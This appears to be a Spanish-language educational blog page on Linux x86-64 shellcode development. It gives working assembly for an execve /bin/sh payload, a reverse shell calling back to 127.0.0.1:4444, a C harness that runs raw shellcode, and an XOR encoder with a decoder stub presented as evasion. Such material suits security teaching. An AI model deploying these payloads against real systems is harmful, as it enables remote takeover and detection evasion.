---
title: Shellcode Basics
description: Fundamentos de desarrollo de shellcode en Linux x86-64
tags:
  - shellcode
  - assembly
  - linux
---

# Shellcode Basics

Fundamentos de desarrollo de shellcode para Linux x86-64: syscalls, técnicas de escritura y consideraciones de Position-Independent Code.

---

## // ¿Qué es Shellcode?

Shellcode es código máquina diseñado para ser inyectado y ejecutado en un proceso víctima. Históricamente llamado "shellcode" porque típicamente spawneaba una shell.

### Características del Shellcode

- **Position-Independent**: Debe funcionar sin importar dónde se cargue en memoria
- **Sin NULL bytes**: Los NULL bytes (`0x00`) terminan strings en C
- **Compacto**: Menor tamaño = mayor versatilidad
- **Self-contained**: No depende de libraries externas

---

## // Syscalls en Linux x86-64

En Linux x86-64, los syscalls se realizan usando la instrucción `syscall`:

```
┌─────────────────────────────────────────────────────────┐
│  SYSCALL CONVENTION (x86-64 Linux)                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  RAX  →  syscall number                                 │
│  RDI  →  1st argument                                   │
│  RSI  →  2nd argument                                   │
│  RDX  →  3rd argument                                   │
│  R10  →  4th argument                                   │
│  R8   →  5th argument                                   │
│  R9   →  6th argument                                   │
│                                                          │
│  syscall  →  execute                                    │
│  RAX      →  return value                               │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### Syscalls Comunes

| Syscall | Number | Descripción |
|---------|--------|-------------|
| `read` | 0 | Leer de file descriptor |
| `write` | 1 | Escribir a file descriptor |
| `open` | 2 | Abrir archivo |
| `close` | 3 | Cerrar file descriptor |
| `execve` | 59 | Ejecutar programa |
| `fork` | 57 | Crear proceso hijo |
| `socket` | 41 | Crear socket |
| `connect` | 42 | Conectar socket |
| `dup2` | 33 | Duplicar file descriptor |

---

## // Hello World Shellcode

### Assembly Code

```asm
; hello.asm - Hello World shellcode
; nasm -f elf64 hello.asm && ld hello.o -o hello

section .text
global _start

_start:
    ; write(1, msg, 13)
    xor rax, rax        ; clear rax
    mov al, 1           ; syscall: write
    mov rdi, rax        ; fd: stdout (1)
    lea rsi, [rel msg]  ; buffer address (PIC)
    mov dl, 13          ; length
    syscall
    
    ; exit(0)
    xor rax, rax
    mov al, 60          ; syscall: exit
    xor rdi, rdi        ; status: 0
    syscall

msg: db "Hello World!", 10
```

### Compilación

```bash
# Ensamblar
nasm -f elf64 hello.asm -o hello.o

# Linkar
ld hello.o -o hello

# Ejecutar
./hello
```

### Extraer Bytes

```bash
# Obtener opcodes
objdump -d hello | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | tr -d '\n'

# O usar objcopy
objcopy -O binary hello hello.bin
xxd -i hello.bin
```

---

## // Execve Shellcode

El shellcode más común: ejecutar `/bin/sh`.

### Versión Básica

```asm
; execve.asm - spawn /bin/sh
section .text
global _start

_start:
    ; Clear registers
    xor rax, rax
    xor rdx, rdx        ; envp = NULL
    
    ; Push "/bin/sh\0" onto stack
    push rax            ; null terminator
    mov rdi, 0x68732f6e69622f  ; "/bin/sh" in little-endian
    push rdi
    
    ; Setup execve(path, argv, envp)
    mov rdi, rsp        ; path = "/bin/sh"
    push rax            ; argv[1] = NULL
    push rdi            ; argv[0] = path
    mov rsi, rsp        ; argv
    
    ; execve syscall
    mov al, 59
    syscall
```

### Evitando NULL Bytes

```asm
; execve_nonull.asm - sin NULL bytes
section .text
global _start

_start:
    ; xor para limpiar sin MOV 0
    xor eax, eax
    xor edx, edx
    
    ; Push string con XOR trick
    push rax
    mov rbx, 0x68732f2f6e69622f  ; "//bin/sh"
    push rbx
    mov rdi, rsp
    
    ; Construir argv
    push rax
    push rdi
    mov rsi, rsp
    
    ; execve (usar AL para evitar NULL en RAX)
    mov al, 59
    syscall
```

---

## // Reverse Shell Shellcode

Shellcode que conecta de vuelta a un servidor atacante.

### Estructura

```
1. socket(AF_INET, SOCK_STREAM, 0)  → crear socket
2. connect(sockfd, addr, len)       → conectar al atacante
3. dup2(sockfd, 0/1/2)              → redirigir stdin/stdout/stderr
4. execve("/bin/sh", ...)           → spawn shell
```

### Código Assembly

```asm
; reverse_shell.asm
; IP: 127.0.0.1 (para testing)
; Port: 4444

section .text
global _start

_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    xor rax, rax
    mov al, 41          ; syscall: socket
    xor rdi, rdi
    mov dil, 2          ; AF_INET
    xor rsi, rsi
    mov sil, 1          ; SOCK_STREAM
    xor rdx, rdx        ; protocol: 0
    syscall
    mov rdi, rax        ; save sockfd
    
    ; struct sockaddr_in
    xor rax, rax
    push rax            ; padding
    mov dword [rsp-4], 0x0100007f  ; IP: 127.0.0.1
    mov word [rsp-6], 0x5c11       ; Port: 4444 (big-endian)
    mov word [rsp-8], 0x02         ; AF_INET
    sub rsp, 8
    
    ; connect(sockfd, addr, 16)
    xor rax, rax
    mov al, 42          ; syscall: connect
    mov rsi, rsp        ; addr struct
    xor rdx, rdx
    mov dl, 16          ; addrlen
    syscall
    
    ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)
    xor rsi, rsi
dup_loop:
    xor rax, rax
    mov al, 33          ; syscall: dup2
    syscall
    inc rsi
    cmp sil, 3
    jl dup_loop
    
    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
```

---

## // Testing Shellcode

### Programa de Prueba en C

```c
// test_shellcode.c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = 
    "\x48\x31\xc0\x48\x31\xd2\x50\x48"
    "\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x53\x48\x89\xe7\x50\x57\x48"
    "\x89\xe6\xb0\x3b\x0f\x05";

int main(void)
{
    printf("[*] Shellcode length: %lu bytes\n", sizeof(shellcode)-1);
    
    // Allocate executable memory
    void *exec = mmap(NULL, sizeof(shellcode), 
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    // Copy shellcode
    memcpy(exec, shellcode, sizeof(shellcode));
    
    printf("[*] Executing shellcode...\n");
    
    // Cast and execute
    ((void(*)())exec)();
    
    return 0;
}
```

### Compilar y Ejecutar

```bash
# Compilar (deshabilitando protecciones para testing)
gcc -z execstack -fno-stack-protector -o test test_shellcode.c

# Ejecutar
./test
```

---

## // Técnicas de Evasión

### Encoding XOR

```python
#!/usr/bin/env python3
# xor_encode.py

shellcode = b"\x48\x31\xc0..."  # tu shellcode
key = 0x41

encoded = bytes([b ^ key for b in shellcode])
print("Encoded: " + "".join(f"\\x{b:02x}" for b in encoded))
```

### Decoder Stub

```asm
; XOR decoder stub
section .text
global _start

_start:
    jmp get_shellcode
    
decoder:
    pop rsi                 ; shellcode address
    xor rcx, rcx
    mov cl, SHELLCODE_LEN   ; length
    
decode_loop:
    xor byte [rsi], 0x41    ; XOR key
    inc rsi
    loop decode_loop
    
    jmp shellcode_start
    
get_shellcode:
    call decoder
    
shellcode_start:
    ; encoded shellcode goes here
    db 0x09, 0x70, 0x81...  ; XOR'd bytes
```

---

## // Checklist de Desarrollo

!!! note "Best Practices"
    - [ ] Verificar ausencia de NULL bytes
    - [ ] Testear en diferentes direcciones de memoria
    - [ ] Minimizar tamaño
    - [ ] Probar con ASLR habilitado
    - [ ] Documentar syscalls usados

---

## // Recursos

!!! tip "Herramientas"
    - [pwntools](https://github.com/Gallopsled/pwntools) - Framework de explotación
    - [shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html) - Generador de shellcode
    - [msfvenom](https://www.metasploit.com/) - Generador de payloads

---

<div class="card-meta" style="justify-content: center; border-top: none; padding-top: 2rem;">
  <span>Publicado: 2025-01-07</span>
  <span>|</span>
  <span>Autor: 0x574R</span>
</div>
